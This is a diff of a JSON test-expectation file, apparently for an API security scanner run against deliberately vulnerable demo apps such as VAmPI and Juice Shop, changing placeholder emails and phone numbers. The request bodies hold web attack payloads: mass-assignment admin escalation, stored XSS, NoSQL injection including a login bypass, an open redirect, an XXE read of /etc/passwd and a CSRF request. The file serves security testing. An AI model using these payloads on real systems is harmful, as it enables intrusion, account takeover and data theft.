@@ -2268,7 +2268,7 @@
             "path": "/vampi/users/v1/register",
             "payload_class": "mass-assignment",
             "minimum_dispatches": 1,
-            "body_exact": "{\"username\":\"masstest1\",\"password\":\"Test1234\",\"email\":\"mass1@evil.example\",\"admin\":true}",
+            "body_exact": "{\"username\":\"masstest1\",\"password\":\"Test1234\",\"email\":\"mass1@example.com\",\"admin\":true}",
             "expected_statuses": [200, 201, 204, 301, 302, 307, 308, 400, 401, 405, 409, 410, 415, 422]
           },
           {
@@ -2277,7 +2277,7 @@
             "path": "/vampi/users/v1/register",
             "payload_class": "mass-assignment",
             "minimum_dispatches": 1,
-            "body_exact": "{\"username\":\"masstest2\",\"password\":\"Test1234\",\"email\":\"mass2@evil.example\",\"role\":\"admin\"}",
+            "body_exact": "{\"username\":\"masstest2\",\"password\":\"Test1234\",\"email\":\"mass2@example.com\",\"role\":\"admin\"}",
             "expected_statuses": [200, 201, 204, 301, 302, 307, 308, 400, 401, 405, 409, 410, 415, 422]
           },
           {
@@ -2286,7 +2286,7 @@
             "path": "/vampi/users/v1/register",
             "payload_class": "mass-assignment",
             "minimum_dispatches": 1,
-            "body_exact": "{\"username\":\"masstest3\",\"password\":\"Test1234\",\"email\":\"mass3@evil.example\",\"balance\":99999}",
+            "body_exact": "{\"username\":\"masstest3\",\"password\":\"Test1234\",\"email\":\"mass3@example.com\",\"balance\":99999}",
             "expected_statuses": [200, 201, 204, 301, 302, 307, 308, 400, 401, 405, 409, 410, 415, 422]
           },
           {
@@ -2295,7 +2295,7 @@
             "path": "/vampi/users/v1/register",
             "payload_class": "mass-assignment",
             "minimum_dispatches": 1,
-            "body_exact": "{\"username\":\"masstest4\",\"password\":\"Test1234\",\"email\":\"mass4@evil.example\",\"admin\":true,\"role\":\"superadmin\",\"is_staff\":true,\"is_superuser\":true,\"balance\":99999}",
+            "body_exact": "{\"username\":\"masstest4\",\"password\":\"Test1234\",\"email\":\"mass4@example.com\",\"admin\":true,\"role\":\"superadmin\",\"is_staff\":true,\"is_superuser\":true,\"balance\":99999}",
             "expected_statuses": [200, 201, 204, 301, 302, 307, 308, 400, 401, 405, 409, 410, 415, 422]
           },
           {
@@ -2340,7 +2340,7 @@
             "path": "/vampi/users/v1/massput/email",
             "payload_class": "mass-assignment",
             "minimum_dispatches": 1,
-            "body_exact": "{\"email\":\"admin@target.local\",\"admin\":true,\"verified\":true}",
+            "body_exact": "{\"email\":\"admin@example.com\",\"admin\":true,\"verified\":true}",
             "header_regex": {
               "authorization": "Bearer [A-Za-z0-9_-]+\\.[A-Za-z0-9_-]+\\.[A-Za-z0-9_-]+"
             },
@@ -7542,7 +7542,7 @@
               "cookie": "PHPSESSID=.+"
             },
             "query_values": {
-              "redirect": "https://trusted-domain.com@evil.example.com"
+              "redirect": "https://trusted-domain.com@example.com.com"
             },
             "expected_statuses": [200, 201, 204, 301, 302, 307, 308, 400, 401, 405, 409, 410, 415, 422]
           },
@@ -8115,7 +8115,7 @@
             "path": "/juice-shop/rest/products/1/reviews",
             "payload_class": "stored-xss-review",
             "minimum_dispatches": 1,
-            "body_exact": "{\"message\":\"<script>alert(\\\"stored-xss\\\")</script>\",\"author\":\"test@test.com\"}",
+            "body_exact": "{\"message\":\"<script>alert(\\\"stored-xss\\\")</script>\",\"author\":\"test@example.com\"}",
             "expected_statuses": [200, 201, 204, 301, 302, 307, 308, 400, 401, 405, 409, 410, 415, 422]
           },
           {
@@ -8133,7 +8133,7 @@
             "path": "/juice-shop/rest/products/1/reviews",
             "payload_class": "stored-xss-review",
             "minimum_dispatches": 1,
-            "body_exact": "{\"message\":\"<img src=x onerror=alert(\\\"stored\\\")>\",\"author\":\"test@test.com\"}",
+            "body_exact": "{\"message\":\"<img src=x onerror=alert(\\\"stored\\\")>\",\"author\":\"test@example.com\"}",
             "expected_statuses": [200, 201, 204, 301, 302, 307, 308, 400, 401, 405, 409, 410, 415, 422]
           },
           {
@@ -8151,7 +8151,7 @@
             "path": "/juice-shop/rest/products/1/reviews",
             "payload_class": "stored-xss-review",
             "minimum_dispatches": 1,
-            "body_exact": "{\"message\":\"<svg onload=alert(\\\"stored\\\")>\",\"author\":\"test@test.com\"}",
+            "body_exact": "{\"message\":\"<svg onload=alert(\\\"stored\\\")>\",\"author\":\"test@example.com\"}",
             "expected_statuses": [200, 201, 204, 301, 302, 307, 308, 400, 401, 405, 409, 410, 415, 422]
           },
           {
@@ -8169,7 +8169,7 @@
             "path": "/juice-shop/rest/products/1/reviews",
             "payload_class": "stored-xss-review",
             "minimum_dispatches": 1,
-            "body_exact": "{\"message\":\"<iframe src=\\\"javascript:alert(1)\\\">\",\"author\":\"test@test.com\"}",
+            "body_exact": "{\"message\":\"<iframe src=\\\"javascript:alert(1)\\\">\",\"author\":\"test@example.com\"}",
             "expected_statuses": [200, 201, 204, 301, 302, 307, 308, 400, 401, 405, 409, 410, 415, 422]
           },
           {
@@ -8187,7 +8187,7 @@
             "path": "/juice-shop/rest/products/1/reviews",
             "payload_class": "stored-xss-review",
             "minimum_dispatches": 1,
-            "body_exact": "{\"message\":\"<b onmouseover=alert(1)>hover me</b>\",\"author\":\"test@test.com\"}",
+            "body_exact": "{\"message\":\"<b onmouseover=alert(1)>hover me</b>\",\"author\":\"test@example.com\"}",
             "expected_statuses": [200, 201, 204, 301, 302, 307, 308, 400, 401, 405, 409, 410, 415, 422]
           },
           {
@@ -8205,7 +8205,7 @@
             "path": "/juice-shop/rest/products/1/reviews",
             "payload_class": "stored-xss-review",
             "minimum_dispatches": 1,
-            "body_exact": "{\"message\":\"<<SCRIPT>alert(\\\"XSS\\\");//<</SCRIPT>\",\"author\":\"test@test.com\"}",
+            "body_exact": "{\"message\":\"<<SCRIPT>alert(\\\"XSS\\\");//<</SCRIPT>\",\"author\":\"test@example.com\"}",
             "expected_statuses": [200, 201, 204, 301, 302, 307, 308, 400, 401, 405, 409, 410, 415, 422]
           },
           {
@@ -8939,7 +8939,7 @@
             "path": "/juice-shop/rest/products/1/reviews",
             "payload_class": "nosql-operator",
             "minimum_dispatches": 1,
-            "body_exact": "{\"message\":{\"$ne\":\"\"},\"author\":\"test@test.com\"}",
+            "body_exact": "{\"message\":{\"$ne\":\"\"},\"author\":\"test@example.com\"}",
             "header_regex": {
               "authorization": "Bearer [A-Za-z0-9_-]+\\.[A-Za-z0-9_-]+\\.[A-Za-z0-9_-]+"
             },
@@ -8951,7 +8951,7 @@
             "path": "/juice-shop/rest/products/1/reviews",
             "payload_class": "nosql-operator",
             "minimum_dispatches": 1,
-            "body_exact": "{\"message\":\"test\",\"author\":\"test@test.com\",\"$where\":\"1==1\"}",
+            "body_exact": "{\"message\":\"test\",\"author\":\"test@example.com\",\"$where\":\"1==1\"}",
             "header_regex": {
               "authorization": "Bearer [A-Za-z0-9_-]+\\.[A-Za-z0-9_-]+\\.[A-Za-z0-9_-]+"
             },
@@ -8975,7 +8975,7 @@
             "path": "/juice-shop/rest/products/2/reviews",
             "payload_class": "nosql-operator",
             "minimum_dispatches": 1,
-            "body_exact": "{\"message\":{\"$ne\":\"\"},\"author\":\"test@test.com\"}",
+            "body_exact": "{\"message\":{\"$ne\":\"\"},\"author\":\"test@example.com\"}",
             "header_regex": {
               "authorization": "Bearer [A-Za-z0-9_-]+\\.[A-Za-z0-9_-]+\\.[A-Za-z0-9_-]+"
             },
@@ -8987,7 +8987,7 @@
             "path": "/juice-shop/rest/products/2/reviews",
             "payload_class": "nosql-operator",
             "minimum_dispatches": 1,
-            "body_exact": "{\"message\":\"test\",\"author\":\"test@test.com\",\"$where\":\"1==1\"}",
+            "body_exact": "{\"message\":\"test\",\"author\":\"test@example.com\",\"$where\":\"1==1\"}",
             "header_regex": {
               "authorization": "Bearer [A-Za-z0-9_-]+\\.[A-Za-z0-9_-]+\\.[A-Za-z0-9_-]+"
             },
@@ -9011,7 +9011,7 @@
             "path": "/juice-shop/rest/products/3/reviews",
             "payload_class": "nosql-operator",
             "minimum_dispatches": 1,
-            "body_exact": "{\"message\":{\"$ne\":\"\"},\"author\":\"test@test.com\"}",
+            "body_exact": "{\"message\":{\"$ne\":\"\"},\"author\":\"test@example.com\"}",
             "header_regex": {
               "authorization": "Bearer [A-Za-z0-9_-]+\\.[A-Za-z0-9_-]+\\.[A-Za-z0-9_-]+"
             },
@@ -9023,7 +9023,7 @@
             "path": "/juice-shop/rest/products/3/reviews",
             "payload_class": "nosql-operator",
             "minimum_dispatches": 1,
-            "body_exact": "{\"message\":\"test\",\"author\":\"test@test.com\",\"$where\":\"1==1\"}",
+            "body_exact": "{\"message\":\"test\",\"author\":\"test@example.com\",\"$where\":\"1==1\"}",
             "header_regex": {
               "authorization": "Bearer [A-Za-z0-9_-]+\\.[A-Za-z0-9_-]+\\.[A-Za-z0-9_-]+"
             },
@@ -9044,7 +9044,7 @@
             "path": "/juice-shop/rest/user/login",
             "payload_class": "nosql-login",
             "minimum_dispatches": 1,
-            "body_exact": "{\"email\":{\"$ne\":\"nonexistent@x.com\"},\"password\":{\"$ne\":\"wrongpassword\"}}",
+            "body_exact": "{\"email\":{\"$ne\":\"nonexistent@example.com\"},\"password\":{\"$ne\":\"wrongpassword\"}}",
             "expected_statuses": [200, 201, 204, 301, 302, 307, 308, 400, 401, 405, 409, 410, 415, 422]
           },
           {
@@ -10014,7 +10014,7 @@
             "header_regex": {
               "authorization": "Bearer [A-Za-z0-9_-]+\\.[A-Za-z0-9_-]+\\.[A-Za-z0-9_-]+"
             },
-            "body_exact": "{\"email\":\"test@test.com\",\"password\":\"test\"}",
+            "body_exact": "{\"email\":\"test@example.com\",\"password\":\"test\"}",
             "expected_statuses": [200, 201, 204, 301, 302, 307, 308, 400, 401, 404, 405, 422]
           },
           {
@@ -10024,7 +10024,7 @@
             "payload_class": "api-enumeration",
             "minimum_dispatches": 1,
             "absent_headers": ["authorization"],
-            "body_exact": "{\"email\":\"test@test.com\",\"password\":\"test\"}",
+            "body_exact": "{\"email\":\"test@example.com\",\"password\":\"test\"}",
             "expected_statuses": [200, 201, 204, 301, 302, 307, 308, 400, 401, 404, 405, 422]
           },
           {
@@ -10096,7 +10096,7 @@
             "header_regex": {
               "authorization": "Bearer [A-Za-z0-9_-]+\\.[A-Za-z0-9_-]+\\.[A-Za-z0-9_-]+"
             },
-            "body_exact": "{\"email\":\"test@test.com\",\"answer\":\"test\",\"new\":\"test\",\"repeat\":\"test\"}",
+            "body_exact": "{\"email\":\"test@example.com\",\"answer\":\"test\",\"new\":\"test\",\"repeat\":\"test\"}",
             "expected_statuses": [200, 201, 204, 301, 302, 307, 308, 400, 401, 404, 405, 422]
           },
           {
@@ -10106,7 +10106,7 @@
             "payload_class": "api-enumeration",
             "minimum_dispatches": 1,
             "absent_headers": ["authorization"],
-            "body_exact": "{\"email\":\"test@test.com\",\"answer\":\"test\",\"new\":\"test\",\"repeat\":\"test\"}",
+            "body_exact": "{\"email\":\"test@example.com\",\"answer\":\"test\",\"new\":\"test\",\"repeat\":\"test\"}",
             "expected_statuses": [200, 201, 204, 301, 302, 307, 308, 400, 401, 404, 405, 422]
           },
           {
@@ -18659,7 +18659,7 @@
             "path": "/restaurant/profile",
             "payload_class": "cross-user-modification",
             "minimum_dispatches": 1,
-            "body_regex": "\"username\":\"(?:victim_[0-9]+|tgen_bola_victim)\",\"phone_number\":\"5550199004\"",
+            "body_regex": "\"username\":\"(?:victim_[0-9]+|tgen_bola_victim)\",\"phone_number\":\"2025550104\"",
             "header_regex": {
               "authorization": "Bearer [A-Za-z0-9_-]+\\.[A-Za-z0-9_-]+\\.[A-Za-z0-9_-]+"
             },
@@ -18668,7 +18668,7 @@
               "content_type": "application/json",
               "json_equals": {
                 "username": "tgen_bola_victim",
-                "phone_number": "5550199004"
+                "phone_number": "2025550104"
               }
             }
           },
@@ -18682,12 +18682,12 @@
               "authorization": "Bearer [A-Za-z0-9_-]+\\.[A-Za-z0-9_-]+\\.[A-Za-z0-9_-]+"
             },
             "expected_statuses": [200, 400, 401, 422],
-            "body_regex": "\"username\":\"(?:admin|tgen_bola_admin)\",\"phone_number\":\"5550199011\"",
+            "body_regex": "\"username\":\"(?:admin|tgen_bola_admin)\",\"phone_number\":\"2025550111\"",
             "response_contract": {
               "content_type": "application/json",
               "json_equals": {
                 "username": "tgen_bola_admin",
-                "phone_number": "5550199011"
+                "phone_number": "2025550111"
               }
             }
           },
@@ -18701,12 +18701,12 @@
               "authorization": "Bearer [A-Za-z0-9_-]+\\.[A-Za-z0-9_-]+\\.[A-Za-z0-9_-]+"
             },
             "expected_statuses": [200, 400, 401, 422],
-            "body_regex": "\"username\":\"(?:chef|tgen_bola_chef)\",\"phone_number\":\"5550199012\"",
+            "body_regex": "\"username\":\"(?:chef|tgen_bola_chef)\",\"phone_number\":\"2025550112\"",
             "response_contract": {
               "content_type": "application/json",
               "json_equals": {
                 "username": "tgen_bola_chef",
-                "phone_number": "5550199012"
+                "phone_number": "2025550112"
               }
             }
           },
@@ -18720,12 +18720,12 @@
               "authorization": "Bearer [A-Za-z0-9_-]+\\.[A-Za-z0-9_-]+\\.[A-Za-z0-9_-]+"
             },
             "expected_statuses": [200, 400, 401, 422],
-            "body_regex": "\"username\":\"(?:manager|tgen_bola_manager)\",\"phone_number\":\"5550199013\"",
+            "body_regex": "\"username\":\"(?:manager|tgen_bola_manager)\",\"phone_number\":\"2025550113\"",
             "response_contract": {
               "content_type": "application/json",
               "json_equals": {
                 "username": "tgen_bola_manager",
-                "phone_number": "5550199013"
+                "phone_number": "2025550113"
               }
             }
           },
@@ -18739,12 +18739,12 @@
               "authorization": "Bearer [A-Za-z0-9_-]+\\.[A-Za-z0-9_-]+\\.[A-Za-z0-9_-]+"
             },
             "expected_statuses": [200, 400, 401, 422],
-            "body_regex": "\"username\":\"(?:root|tgen_bola_root)\",\"phone_number\":\"5550199014\"",
+            "body_regex": "\"username\":\"(?:root|tgen_bola_root)\",\"phone_number\":\"2025550114\"",
             "response_contract": {
               "content_type": "application/json",
               "json_equals": {
                 "username": "tgen_bola_root",
-                "phone_number": "5550199014"
+                "phone_number": "2025550114"
               }
             }
           }
@@ -27510,7 +27510,7 @@
             "headers": {
               "content-type": "application/xml"
             },
-            "body_exact": "<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><user><username>&xxe;</username><password>test</password><email>xxe@evil.example</email></user>",
+            "body_exact": "<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><user><username>&xxe;</username><password>test</password><email>xxe@example.com</email></user>",
             "expected_statuses": [200, 201, 204, 301, 302, 307, 308, 400, 401, 405, 409, 410, 415, 422, 404]
           },
           {
@@ -27522,7 +27522,7 @@
             "headers": {
               "content-type": "application/xml"
             },
-            "body_exact": "<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><user><username>&xxe;</username><password>test</password><email>xxe@evil.example</email></user>",
+            "body_exact": "<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><user><username>&xxe;</username><password>test</password><email>xxe@example.com</email></user>",
             "expected_statuses": [200, 201, 204, 301, 302, 307, 308, 400, 401, 405, 409, 410, 415, 422, 404]
           },
           {
@@ -27534,7 +27534,7 @@
             "headers": {
               "content-type": "text/xml"
             },
-            "body_exact": "<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><user><username>&xxe;</username><password>test</password><email>xxe@evil.example</email></user>",
+            "body_exact": "<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><user><username>&xxe;</username><password>test</password><email>xxe@example.com</email></user>",
             "expected_statuses": [200, 201, 204, 301, 302, 307, 308, 400, 401, 405, 409, 410, 415, 422, 404]
           },
           {
@@ -27920,7 +27920,7 @@
             "path": "/juice-shop/api/Users",
             "payload_class": "csrf-request",
             "minimum_dispatches": 1,
-            "body_exact": "{\"email\":\"csrf@evil.example\",\"password\":\"Test1234\",\"passwordRepeat\":\"Test1234\"}",
+            "body_exact": "{\"email\":\"csrf@example.com\",\"password\":\"Test1234\",\"passwordRepeat\":\"Test1234\"}",
             "headers": {
               "content-type": "application/json",
               "origin": "http://evil.example"
